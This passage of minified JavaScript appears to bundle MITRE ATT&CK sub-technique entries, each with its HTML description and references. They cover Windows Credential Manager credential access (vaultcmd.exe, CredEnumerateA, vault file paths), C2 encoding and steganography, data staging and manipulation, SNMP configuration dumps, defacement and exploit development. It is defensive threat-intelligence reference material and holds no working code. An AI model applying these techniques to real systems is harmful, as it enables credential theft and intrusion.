Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fjuusosalonen.com\u002Fpost\u002F30923743427\u002Fbreaking-into-the-os-x-keychain'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";nX.external_references=[{source_name:b,external_id:nY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1555\u002F002"},{url:"http:\u002F\u002Fjuusosalonen.com\u002Fpost\u002F30923743427\u002Fbreaking-into-the-os-x-keychain",description:"Juuso Salonen. (2012, September 5). Breaking into the OS X keychain. Retrieved July 15, 2017.",source_name:"OS X Keychain"},{url:b_,description:b$,source_name:ca},{url:eM,description:eN,source_name:eO}];nX["subtechnique-of"]=as;nZ.id=n_;nZ["object-type"]=a;nZ.name="Windows Credential Manager";nZ.description="Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and\u002For devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2012-r2-and-2012\u002Fhh994565(v=ws.11)#credential-manager-store'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-8.1-and-8\u002Fjj554668(v=ws.11)?redirectedfrom=MSDN'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1555\u002F003'\u003ECredentials from Web Browsers\u003C\u002Fa\u003E, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted \u003Ccode\u003E.vcrd\u003C\u002Fcode\u003E files, located under \u003Ccode\u003E%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault\u002FCredentials]\\\u003C\u002Fcode\u003E. The encryption key can be found in a file named \u003Ccode\u003EPolicy.vpol\u003C\u002Fcode\u003E, typically located in the same folder as the credentials.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.passcape.com\u002Fwindows_password_recovery_vault_explorer'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002F101\u002F2016\u002F01\u002Fthe-windows-vaults\u002F '\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. \u003Ccode\u003Evaultcmd.exe\u003C\u002Fcode\u003E is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may gather credentials by reading files located inside of the Credential Lockers. Adversaries may also abuse Windows APIs such as \u003Ccode\u003ECredEnumerateA\u003C\u002Fcode\u003E to list credentials managed by the Credential Manager.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fapi\u002Fwincred\u002Fnf-wincred-credenumeratea'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fgentilkiwi\u002Fmimikatz\u002Fwiki\u002Fhowto-~-credential-manager-saved-credentials'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may use password recovery tools to obtain plain text passwords from the Credential Manager.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002F101\u002F2016\u002F01\u002Fthe-windows-vaults\u002F '\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";nZ.external_references=[{source_name:b,external_id:n_,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1555\u002F004"},{source_name:"Microsoft Credential Manager store",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2012-r2-and-2012\u002Fhh994565(v=ws.11)#credential-manager-store",description:"Microsoft. (2016, August 31). Cached and Stored Credentials Technical Overview. Retrieved November 24, 2020."},{source_name:"Microsoft Credential Locker",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-8.1-and-8\u002Fjj554668(v=ws.11)?redirectedfrom=MSDN",description:"Microsoft. (2013, October 23). Credential Locker Overview. Retrieved November 24, 2020."},{source_name:"passcape Windows Vault",url:"https:\u002F\u002Fwww.passcape.com\u002Fwindows_password_recovery_vault_explorer",description:"Passcape. (n.d.). Windows Password Recovery - Vault Explorer and Decoder. Retrieved November 24, 2020."},{source_name:"Malwarebytes The Windows Vault",url:"https:\u002F\u002Fblog.malwarebytes.com\u002F101\u002F2016\u002F01\u002Fthe-windows-vaults\u002F ",description:"Arntz, P. (2016, March 30). The Windows Vault . Retrieved November 23, 2020."},{source_name:"Microsoft CredEnumerate",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fapi\u002Fwincred\u002Fnf-wincred-credenumeratea",description:"Microsoft. (2018, December 5). CredEnumarateA function (wincred.h). Retrieved November 24, 2020."},{source_name:"Delpy Mimikatz Crendential Manager",url:"https:\u002F\u002Fgithub.com\u002Fgentilkiwi\u002Fmimikatz\u002Fwiki\u002Fhowto-~-credential-manager-saved-credentials",description:"Delpy, B. (2017, December 12). howto ~ credential manager saved credentials. Retrieved November 23, 2020."}];nZ["subtechnique-of"]=as;om.id=on;om["object-type"]=a;om.name="Non-Standard Encoding";om.description="Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FBinary-to-text_encoding'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FCharacter_encoding'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ";om.external_references=[{source_name:b,external_id:on,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1132\u002F002"},{url:eS,description:eT,source_name:eU},{url:eV,description:eW,source_name:eX},{url:f,description:g,source_name:h}];om["subtechnique-of"]=cw;oo.id=op;oo["object-type"]=a;oo.name="Standard Encoding";oo.description="Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FBinary-to-text_encoding'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FCharacter_encoding'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Some data encoding systems may also result in data compression, such as gzip.";oo.external_references=[{source_name:b,external_id:op,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1132\u002F001"},{url:eS,description:eT,source_name:eU},{url:eV,description:eW,source_name:eX},{url:f,description:g,source_name:h}];oo["subtechnique-of"]=cw;ou.id=ov;ou["object-type"]=a;ou.name="Runtime Data Manipulation";ou.description="Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcontent.fireeye.com\u002Fapt\u002Frpt-apt38'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.justice.gov\u002Fopa\u002Fpress-release\u002Ffile\u002F1092091\u002Fdownload'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F001'\u003EChange Default File Association\u003C\u002Fa\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.";ou.external_references=[{source_name:b,external_id:ov,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1565\u002F003"},{description:eY,url:eZ,source_name:e_},{source_name:cx,url:cy,description:cz}];ou["subtechnique-of"]=bv;ow.id=ox;ow["object-type"]=a;ow.name="Stored Data Manipulation";ow.description="Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcontent.fireeye.com\u002Fapt\u002Frpt-apt38'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.justice.gov\u002Fopa\u002Fpress-release\u002Ffile\u002F1092091\u002Fdownload'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.";ow.external_references=[{source_name:b,external_id:ox,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1565\u002F001"},{description:eY,url:eZ,source_name:e_},{source_name:cx,url:cy,description:cz}];ow["subtechnique-of"]=bv;oy.id=oz;oy["object-type"]=a;oy.name="Transmitted Data Manipulation";oy.description="Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcontent.fireeye.com\u002Fapt\u002Frpt-apt38'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.justice.gov\u002Fopa\u002Fpress-release\u002Ffile\u002F1092091\u002Fdownload'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.";oy.external_references=[{source_name:b,external_id:oz,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1565\u002F002"},{description:eY,url:eZ,source_name:e_},{source_name:cx,url:cy,description:cz}];oy["subtechnique-of"]=bv;oA.id=oB;oA["object-type"]=a;oA.name="Junk Data";oA.description="Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending\u002Fprepending data with junk characters or writing junk characters between significant characters. ";oA.external_references=[{source_name:b,external_id:oB,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1001\u002F001"},{url:f,description:g,source_name:h}];oA["subtechnique-of"]=bw;oC.id=oD;oC["object-type"]=a;oC.name="Protocol Impersonation";oC.description="Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL\u002FTLS handshake to make it look like subsequent traffic is SSL\u002FTLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. ";oC.external_references=[{source_name:b,external_id:oD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1001\u002F003"},{url:f,description:g,source_name:h}];oC["subtechnique-of"]=bw;oE.id=oF;oE["object-type"]=a;oE.name=oG;oE.description="Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ";oE.external_references=[{source_name:b,external_id:oF,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1001\u002F002"},{url:f,description:g,source_name:h}];oE["subtechnique-of"]=bw;oH.id=oI;oH["object-type"]=a;oH.name="Local Data Staging";oH.description="Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1560'\u003EArchive Collected Data\u003C\u002Fa\u003E. Interactive command shells may be used, and common functionality within \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E and bash may be used to copy data into a staging location.";oH.external_references=[{source_name:b,external_id:oI,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1074\u002F001"}];oH["subtechnique-of"]=cA;oJ.id=oK;oJ["object-type"]=a;oJ.name="Remote Data Staging";oJ.description="Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1560'\u003EArchive Collected Data\u003C\u002Fa\u003E. Interactive command shells may be used, and common functionality within \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E and bash may be used to copy data into a staging location.\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1578\u002F002'\u003ECreate Cloud Instance\u003C\u002Fa\u003E and stage data in that instance.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcontent.fireeye.com\u002Fm-trends\u002Frpt-m-trends-2020'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.";oJ.external_references=[{source_name:b,external_id:oK,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1074\u002F002"},{source_name:am,url:an,description:ao}];oJ["subtechnique-of"]=cA;oQ.id=oR;oQ["object-type"]=a;oQ.name="Network Device Configuration Dump";oQ.description="Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fus-cert.cisa.gov\u002Fncas\u002Falerts\u002FTA18-106A'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ";oQ.external_references=[{source_name:b,external_id:oR,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1602\u002F002"},{source_name:oS,url:oT,description:oU},{source_name:K,url:L,description:M},{source_name:bo,url:bp,description:bq}];oQ["subtechnique-of"]=cB;oV.id=oW;oV["object-type"]=a;oV.name="SNMP (MIB Dump)";oV.description="Adversaries may target the Management Information Base (MIB) to collect and\u002For mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sans.org\u002Freading-room\u002Fwhitepapers\u002Fnetworkdevs\u002Fsecuring-snmp-net-snmp-snmpv3-1051'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA18-106A'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ";oV.external_references=[{source_name:b,external_id:oW,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1602\u002F001"},{source_name:"SANS Information Security Reading Room Securing SNMP Securing SNMP",url:"https:\u002F\u002Fwww.sans.org\u002Freading-room\u002Fwhitepapers\u002Fnetworkdevs\u002Fsecuring-snmp-net-snmp-snmpv3-1051",description:"Michael Stump. (2003). Information Security Reading Room Securing SNMP: A Look atNet-SNMP (SNMPv3). Retrieved October 19, 2020."},{source_name:dX,url:dY,description:dZ},{source_name:K,url:L,description:M},{source_name:oN,url:oO,description:oP}];oV["subtechnique-of"]=cB;pb.id=pc;pb["object-type"]=a;pb.name="Confluence";pb.description="\nAdversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:\n\n* Policies, procedures, and standards\n* Physical \u002F logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing \u002F development credentials\n* Work \u002F project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n";pb.external_references=[{source_name:b,external_id:pc,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1213\u002F001"},{url:o_,description:o$,source_name:pa}];pb["subtechnique-of"]=bx;pd.id=pe;pd["object-type"]=a;pd.name="Sharepoint";pd.description="Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical \u002F logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing \u002F development credentials\n* Work \u002F project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n";pd.external_references=[{source_name:b,external_id:pe,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1213\u002F002"},{url:oX,description:oY,source_name:oZ}];pd["subtechnique-of"]=bx;pk.id=pl;pk["object-type"]=a;pk.name="External Defacement";pk.description="An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fcurrent-threats\u002Fpdfs\u002Fib-entertainment.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.intelligence.senate.gov\u002Fsites\u002Fdefault\u002Ffiles\u002Fdocuments\u002Fos-kmandia-033017.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftorrentfreak.com\u002Fanonymous-hackers-deface-russian-govt-site-to-protest-web-blocking-nsfw-180512\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1491\u002F002'\u003EExternal Defacement\u003C\u002Fa\u003E may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocuments.trendmicro.com\u002Fassets\u002Fwhite_papers\u002Fwp-a-deep-dive-into-defacement.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";pk.external_references=[{source_name:b,external_id:pl,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1491\u002F002"},{source_name:"FireEye Cyber Threats to Media Industries",url:"https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fcurrent-threats\u002Fpdfs\u002Fib-entertainment.pdf",description:"FireEye. (n.d.). Retrieved April 19, 2019."},{source_name:"Kevin Mandia Statement to US Senate Committee on Intelligence",url:"https:\u002F\u002Fwww.intelligence.senate.gov\u002Fsites\u002Fdefault\u002Ffiles\u002Fdocuments\u002Fos-kmandia-033017.pdf",description:"Kevin Mandia. (2017, March 30). Prepared Statement of Kevin Mandia, CEO of FireEye, Inc. before the United States Senate Select Committee on Intelligence. Retrieved April 19, 2019."},{source_name:"Anonymous Hackers Deface Russian Govt Site",url:"https:\u002F\u002Ftorrentfreak.com\u002Fanonymous-hackers-deface-russian-govt-site-to-protest-web-blocking-nsfw-180512\u002F",description:"Andy. (2018, May 12). ‘Anonymous’ Hackers Deface Russian Govt. Site to Protest Web-Blocking (NSFW). Retrieved April 19, 2019."},{source_name:"Trend Micro Deep Dive Into Defacement",url:"https:\u002F\u002Fdocuments.trendmicro.com\u002Fassets\u002Fwhite_papers\u002Fwp-a-deep-dive-into-defacement.pdf",description:"Marco Balduzzi, Ryan Flores, Lion Gu, Federico Maggi, Vincenzo Ciancaglini, Roel Reyes, Akira Urano. (n.d.). A Deep Dive into Defacement: How Geopolitical Events Trigger Web Attacks. Retrieved April 19, 2019."}];pk["subtechnique-of"]=cC;pm.id=pn;pm["object-type"]=a;pm.name="Internal Defacement";pm.description="An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.operationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Disturbing or offensive images may be used as a part of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1491\u002F001'\u003EInternal Defacement\u003C\u002Fa\u003E in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.\u003Csup\u003E\u003Ca href='https:\u002F\u002Foperationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Destructive-Malware-Report.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";pm.external_references=[{source_name:b,external_id:pn,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1491\u002F001"},{source_name:e$,description:fa,url:fb},{source_name:fc,description:fd,url:fe}];pm["subtechnique-of"]=cC;pz.id=pA;pz["object-type"]=a;pz.name=pB;pz.description="Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FCode_signing'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Users and\u002For security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F002'\u003ECode Signing\u003C\u002Fa\u003E, adversaries may develop self-signed code signing certificates for use in operations.";pz.external_references=[{source_name:b,external_id:pA,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587\u002F002"},{url:ff,description:fg,source_name:fh}];pz["subtechnique-of"]=aP;pC.id=pD;pC["object-type"]=a;pC.name=fi;pC.description="Adversaries may create self-signed SSL\u002FTLS certificates that can be used during targeting. SSL\u002FTLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\n\nAdversaries may create self-signed SSL\u002FTLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1573\u002F002'\u003EAsymmetric Cryptography\u003C\u002Fa\u003E with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071\u002F001'\u003EWeb Protocols\u003C\u002Fa\u003E) or even enabling \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1557'\u003EMan-in-the-Middle\u003C\u002Fa\u003E if added to the root of trust (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F004'\u003EInstall Root Certificate\u003C\u002Fa\u003E).\n\nAfter creating a digital certificate, an adversary may then install that certificate (see \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1608\u002F003'\u003EInstall Digital Certificate\u003C\u002Fa\u003E) on infrastructure under their control.";pC.external_references=[{source_name:b,external_id:pD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587\u002F003"},{source_name:fj,url:fk,description:fl}];pC["subtechnique-of"]=aP;pE.id=pF;pE["object-type"]=a;pE.name=pG;pE.description="Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding\u002Fmodifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.nytimes.com\u002F2011\u002F01\u002F16\u002Fworld\u002Fmiddleeast\u002F16stuxnet.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may use information acquired via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588\u002F006'\u003EVulnerabilities\u003C\u002Fa\u003E to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.irongeek.com\u002Fi.php?page=videos\u002Fbsidescharm2017\u002Fbsidescharm-2017-t111-microsoft-patch-analysis-for-exploitation-stephen-sims'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1190'\u003EExploit Public-Facing Application\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1203'\u003EExploitation for Client Execution\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1068'\u003EExploitation for Privilege Escalation\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1211'\u003EExploitation for Defense Evasion\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1212'\u003EExploitation for Credential Access\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1210'\u003EExploitation of Remote Services\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1499\u002F004'\u003EApplication or System Exploitation\u003C\u002Fa\u003E).";pE.external_references=[{source_name:b,external_id:pF,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587\u002F004"},{source_name:jn,description:jo,url:jp},{source_name:"Irongeek Sims BSides 